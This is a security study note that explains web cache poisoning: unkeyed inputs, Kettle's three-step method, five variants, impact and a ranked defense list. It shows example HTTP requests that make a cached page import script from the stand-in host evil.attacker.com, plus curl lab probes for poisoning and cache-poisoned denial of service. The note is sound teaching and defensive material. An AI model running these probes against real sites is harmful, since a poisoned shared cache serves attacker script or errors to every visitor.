---
migration_source: published-html-snapshot
migration_status: needs-editorial-review
---

# Web Cache Poisoning

## Definition

Web cache poisoning is an attack that makes a **shared cache store a harmful response**, which the cache then serves to every later user who requests the same cache key. The mechanism is a mismatch: the attacker manipulates an **unkeyed input** (a header, parameter, or quirk the origin reflects into the response) while the cache stores the result under a key that *excludes* that input. One attacker request is therefore served to many victims who send entirely "normal" requests. This is the offensive deep-dive on class 2 of [[caching-and-security|caching and security]]; the parent note holds the broader six-class taxonomy and the defender header policy.

## Why it matters

A cache turns a self-only reflected bug into an everyone-stored bug. That amplification is the whole danger:

- **Scope: one request poisons many users.** A reflected value that would normally only affect the attacker's own page becomes a stored payload served from the edge to every visitor on that cache key — XSS, redirects, or denial at population scale.
- **The cache key *is* the security boundary.** The recurring lesson from the parent note sharpens here: if the origin reads a signal the cache does not vary on, the cache serves one user's interpretation to another. Web cache poisoning is the systematic exploitation of that gap.
- **It is a methodology, not a payload.** James Kettle's research reframed it from a curiosity into a repeatable three-step process (find an unkeyed input → make it harmful → get it cached). Holding that loop lets you test any caching stack, which is why this note is methodology-shaped.

## How it works

The attack has **2 preconditions** — an unkeyed input that influences the response, and a cacheable response — exploited via Kettle's **3-step methodology**:

1. **Identify an unkeyed input.** Add candidate headers/parameters and watch whether the response *changes* while the cache key does *not* (compare `X-Cache: miss/hit`, `Age`). The classic unkeyed inputs are `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Port`, `X-Host`, `X-Original-URL`, and `Forwarded`.
2. **Elicit a harmful response.** Drive that input to produce something dangerous reflected into the page — an attacker-controlled script/`src`, an open redirect, a header injection, or an error.
3. **Get it cached.** Confirm the response is cacheable and land it on a key victims will request, so the poison is served to others.

A worked probe (note the cache-buster `cb` — see *Techniques* for why it is mandatory):

```
GET /en?cb=8f3a1 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.attacker.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=300
X-Cache: miss
...
<link rel="canonical" href="https://evil.attacker.com/en?cb=8f3a1">
<script src="https://evil.attacker.com/static/main.js"></script>   <!-- reflected & weaponizable -->
```

A second request to the *same* URL with **no** header returns `X-Cache: hit` and still serves the `evil.attacker.com` script — a stored XSS for everyone on that key:

```
GET /en?cb=8f3a1 HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
X-Cache: hit
...
<script src="https://evil.attacker.com/static/main.js"></script>   <!-- served to victims -->
```

The bug is not that a cache exists; it is that the cache key omits an input the origin trusts. The cache converts a normally self-only reflected bug into a stored, served-to-all bug.

## Techniques / patterns

- **Always test with a cache-buster.** Append a unique query value (`?cb=<random>`) so you poison only *your own* key and never real users. Poisoning a production key without a buster is harming bystanders — the cardinal safety rule of this class.
- **Hunt unkeyed inputs systematically.** Spray header wordlists (Burp's Param Miner) for inputs that change the response but not the key: forwarded-host/scheme/port variants, `X-Original-URL`/`X-Rewrite-URL`, cookies, and `Accept-Language`.
- **Confirm the cache, then the key.** Read `X-Cache`, `CF-Cache-Status`, `Age`, and `X-Served-By` to know whether a response is cached and what the key includes. No caching, no poisoning.
- **Find where reflections land.** Canonical links, redirects, imported `<script>`/`<link>` URLs, Open Graph tags, and error pages are the high-value reflection sinks.
- **Fingerprint the cache.** Cloudflare, Fastly/Varnish, Akamai, and Nginx normalize keys differently (case, encoding, delimiters, default ports) — the normalization gaps are the cache-key-flaw vectors.
- **A weak reflection still poisons.** Even an unkeyed input that only changes a redirect target or triggers an error is a viable vector (open-redirect or cache-poisoned DoS).

## Variants and bypasses

**5 families** of web cache poisoning.

### 1. Unkeyed header poisoning (canonical)

`X-Forwarded-Host`/`X-Forwarded-Scheme`/`X-Forwarded-Port` reflected into absolute URLs (canonical tags, redirects, imported scripts) but absent from the cache key. Poison the cache so victims load the attacker's host → stored XSS or malicious script import.

### 2. Unkeyed query, cookie, or port inputs

Inputs beyond headers — a reflected query parameter the cache strips from the key, an unkeyed cookie, or a port the cache ignores — drive the same reflection-into-cache outcome.

### 3. Cache-key normalization flaws and cache-key injection (Web Cache Entanglement)

Discrepancies in how the cache normalizes the key versus the origin (case-folding, URL-encoding, delimiter handling, `;`-parameters) let an attacker land a poisoned response on a key that *normal* victim requests resolve to. Kettle's "Web Cache Entanglement" research generalized this beyond simple unkeyed headers.

### 4. Fat GET and parameter cloaking

The cache keys on the URL, but the origin also reads the GET request *body* or treats `&`/`;`-delimited parameters differently than the cache — smuggling an unkeyed input past the key.

### 5. Cache-poisoned denial-of-service (CPDoS)

Instead of XSS, poison the cache with an *error*: an oversized or malformed request header makes the origin emit a `400`/`404`/`502` that the cache stores and serves to all users of the key (Nguyen et al., "Cache-Poisoned Denial-of-Service," CCS 2019 — https://cpdos.org/). Availability impact without any reflected payload.

> Distinct from **cache deception** (the inverse: tricking the cache into storing *dynamic personalized* content under a static-looking key) — covered as a sibling class in [[caching-and-security|caching and security]].

## Impact

Ordered by severity:

- **Mass stored XSS.** A poisoned script/`src` served from the edge runs in every visitor's browser on that key — population-scale client compromise.
- **Mass malicious redirect / script import.** Victims are sent to, or load code from, the attacker's host.
- **Credential or token theft.** Poisoned content harvests sessions, CSRF tokens, or OAuth artifacts from many users.
- **Cache-poisoned DoS.** A cached error denies the resource to all users of the key until TTL expiry or purge.
- **Persistence and IR drag.** The poison survives until the (often distributed) cache is purged — remediation is slower than fixing the origin.

## Detection and defense

Ordered by effectiveness:

1.
**Don't reflect request-controlled input into cacheable responses.**
   The structural fix. If the origin never reflects `X-Forwarded-Host` and friends into the body/headers of a cacheable response, there is nothing to poison. Where reflection is unavoidable, validate against an allowlist (e.g., a fixed canonical host).

2.
**Make the cache key include every input the origin trusts.**
   Any origin-read signal absent from the key is a poisoning candidate. Configure the CDN's cache key explicitly to cover the headers/parameters the origin actually uses — key on what you trust.

3.
**Disable caching for responses that vary on unkeyed inputs.**
   `Cache-Control: no-store` / `private` for responses whose content depends on inputs you cannot safely key on. Don't let dynamic, input-dependent content into a shared cache.

4.
**Normalize consistently between cache and origin.**
   Align case-folding, URL-decoding, delimiter handling, trailing slashes, and default ports so the cache-key-flaw and fat-GET vectors close.

5.
**Strip unexpected request headers at the edge.**
   Remove `X-Forwarded-Host`, `X-Original-URL`, and other client-supplied routing headers before they reach the origin unless a proven-safe path needs them.

6.
**Log cache status with security context.**
   Record HIT/MISS/BYPASS, the cache-key inputs, and authenticated vs anonymous state so poisoning does not look like a random, unreproducible XSS report.

### What does not work as a primary defense

- **Input validation/sanitization alone.** Sanitizing the reflected value may stop XSS but not a cached *redirect* or a cache-poisoned *error*; the poisoning channel (unkeyed input + caching) is still open.
- **`Vary` as a fix.** Many intermediaries ignore or compress `Vary`; it is not a reliable security boundary (see the parent note).
- **Trusting CDN defaults.** CDNs optimize for cache-hit performance; safe cache-key behavior must be configured intentionally.
- **Testing a single request.** Poisoning needs two perspectives — store as the attacker, retrieve as a victim — so single-request testing misses it entirely.

## Practical labs

Run only against systems you own or are authorized to test. **Always** use a cache-buster so you poison only your own key.

### Probe for an unkeyed, reflected header

```
url='https://app.example.com/?cb=lab1'
curl -sk "$url" -H 'X-Forwarded-Host: poison.example' | rg -i 'poison.example'
# If poison.example is reflected (in canonical/redirect/script), it is a candidate.
```

### Confirm the input is unkeyed and the response is cached

```
url='https://app.example.com/?cb=lab2'
curl -skI "$url" -H 'X-Forwarded-Host: poison.example' | rg -i 'x-cache|cf-cache-status|age|cache-control'
curl -skI "$url" | rg -i 'x-cache|cf-cache-status|age'   # second request: HIT with the poison = unkeyed
```

### Test a two-request poisoning shape (on your own cache-buster key)

```
url='https://app.example.com/?cb=lab3'
curl -sk  "$url" -H 'X-Forwarded-Host: poison.example' >/dev/null   # store
curl -sk  "$url" | rg -i 'poison.example'                           # retrieve as a clean request
# A clean request returning poison.example = confirmed poisoning of that key.
```

### Probe for cache-poisoned DoS (carefully, owned lab only)

```
# An oversized/malformed header that the origin rejects but the cache stores:
curl -skI 'https://app.example.com/?cb=lab4' -H "X-Oversized: $(printf 'A%.0s' {1..8000})" | rg -i 'http/|x-cache|age'
# Watch for a cached 4xx that a subsequent clean request also receives.
```

## Practical examples

- **`X-Forwarded-Host` → stored XSS.** A site reflects the header into a `<script src>`; an attacker poisons the homepage cache so every visitor loads attacker JS — Kettle's canonical case.
- **`X-Forwarded-Scheme` → cached redirect.** Reflected into a redirect, it loops victims or sends them to an attacker host, served from cache.
- **Cache-key normalization flaw.** A case/encoding discrepancy (Web Cache Entanglement) lands a poisoned response on the key that ordinary requests resolve to, without any obvious unkeyed header.
- **CPDoS outage.** An oversized header poisons a `400` onto a critical asset's key; all users of that edge node get the error until purge.
- **Poisoned CDN serving malicious JS.** A bug-bounty-class finding where one request makes a CDN serve attacker-controlled script to the entire visitor population on that route.

## Related notes

- [[caching-and-security|Caching and Security]] — the parent; the six-class caching taxonomy and defender header policy this note deep-dives class 2 of.
- [[request-smuggling]] — parser disagreement can poison shared caches and request queues; the adjacent Kettle research lineage.
- [[xss]] — the usual payload delivered by a poisoned response.
- [[open-redirect]] — a frequent poisoning outcome when the reflected input feeds a redirect.
- [[content-security-policy]] — limits the blast radius of a poisoned script import (defense-in-depth, not a fix).
- [[same-origin-policy]] — why a poisoned same-origin script is so powerful: it runs *inside* the origin.
- [[http-headers|HTTP Headers]] — `Cache-Control`, `Vary`, `Age`, and `X-Forwarded-*` semantics.
- [[reverse-proxies|Reverse Proxies]] — where shared caches live in the request path.
- [[attacker-defender-duality-as-a-learning-tool|Attacker-Defender Duality]] — poisoning vs cache-key hygiene from opposite chairs.

### Suggested future atomic notes

- cache-deception
- cache-poisoning-dos
- host-header-attacks
- param-miner-and-unkeyed-input-discovery

> Future atomic notes are listed as `<span class="unresolved-link" title="Unpublished or unresolved: wikilinks">wikilinks</span>` even when the target file does not exist yet, so they register as forward-links in Obsidian.

## References

- **Research / Deep Dive:** James Kettle (PortSwigger) — Practical Web Cache Poisoning — https://portswigger.net/research/practical-web-cache-poisoning
- **Testing / Lab:** PortSwigger Web Security Academy — Web cache poisoning — https://portswigger.net/web-security/web-cache-poisoning
- **Research / Deep Dive:** James Kettle (PortSwigger) — Web Cache Entanglement: Novel Pathways to Poisoning — https://portswigger.net/research/web-cache-entanglement
- **Foundational:** RFC 9111 — HTTP Caching — https://www.rfc-editor.org/rfc/rfc9111
